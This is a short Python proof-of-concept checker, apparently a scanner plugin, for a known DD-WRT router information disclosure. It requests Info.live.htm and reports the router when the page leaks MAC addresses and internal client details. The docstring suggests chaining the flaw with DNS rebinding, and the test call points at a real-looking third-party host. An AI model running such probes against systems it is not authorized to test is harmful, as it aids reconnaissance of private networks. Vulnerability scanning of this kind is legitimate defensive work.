#!/usr/bin/env python
# coding: UTF-8

'''
author: yichin
name: DD-WRT v24-preSP2 information disclosure
refer: http://www.devttys0.com/2010/12/dd-wrt-i-know-where-you-live/
description:
    访问 http://foobar/Info.live.htm可获得路由器的以下信息：
        * Router’s LAN/WAN/WLAN MAC addresses
        * Router’s internal IP address
        * Internal client’s IP addresses and host names
    比较鸡肋，可以配合其他漏洞一起使用，例如 DNS rebinding attack：
    https://media.blackhat.com/bh-us-10/whitepapers/Heffner/BlackHat-USA-2010-Heffner-How-to-Hack-Millions-of-Routers-wp.pdf
'''

import urlparse
from ..miniCurl import Curl
from ..t  import T


class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        payload = arg + 'Info.live.htm'
        code, head, res, err, _ = curl.curl2(payload)
        if code == 200 and 'lan_mac' in res:
            output('information disclosure: ' + payload,result,'info')

        del curl
        return result


def output(url,result,label):
    info = url + '  ddwrt  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='info Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/www/www_69e3689b1b5850072fabb57f691bff55.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/www/www_69e3689b1b5850072fabb57f691bff55.py
#/root/github/poccreate/codesrc/exp-1864.py